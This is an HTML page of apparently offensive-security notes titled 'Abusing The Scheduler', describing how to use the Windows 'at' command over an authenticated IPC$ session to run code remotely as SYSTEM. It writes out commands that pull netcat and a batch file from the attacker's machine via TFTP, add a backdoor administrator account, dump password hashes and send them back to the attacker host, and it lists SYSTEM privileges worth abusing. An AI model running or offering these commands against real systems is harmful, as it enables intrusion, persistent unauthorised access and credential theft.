<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Abusing The Scheduler</title>
</head><body>net use \\target\ipc$ password /user:username<br/>
at \\target 12:00pm command<br/>
	Example: at \\192.168.1.1 12:00pm tftp -I myip GET nc.exe<br/>
<br/>
At is as good as having a shell:<br/>
	Enable / Start Services<br/>
	Transfer files<br/>
	Adding users<br/>
	Messing with the registry / policies<br/>
	Pretty much anything you can do with a shell<br/>
	Added bonus, defaults to run as SYSTEM<br/>
<br/>
Building a tool around AT<br/>
	FLOW<br/>
		Establish authenticated session<br/>
		Determine time on target<br/>
		Pass commands to the target to be run 1 min from now<br/>
			Write a batch file that executes everything at once<br/>
			Have the target send you back whatever info you want<br/>
			Be mindful of file transfer protocols, TFTP is good but not always &quot;quiet&quot; or available<br/>
Example<br/>
net use \\target<br/>
net time \\target<br/>
at \\target (net time +1 min) &quot;tftp -i use GET e.bat&quot;<br/>
at \\target (net time +2 min) e.bat<br/>
e.bat does:<br/>
	adds a user (net user hacked hacked /add)<br/>
		Admin group (net localgroup adminsitrators hacked /add)<br/>
	gets hashdumping tools and dumps hashes<br/>
	sends hashes, identified by IP back to attacker host<br/>
<br/>
<br/>
Privileges of LocalSystem that we cate about<br/>
NT AUTHORITY\SYSTEM and <br/>
BUILTIN\Administrators SIDs<br/>
SE_IMPERSONATE_NAME<br/>
SE_TCB_NAME<br/>
SE_DEBUG_NAME</body></html>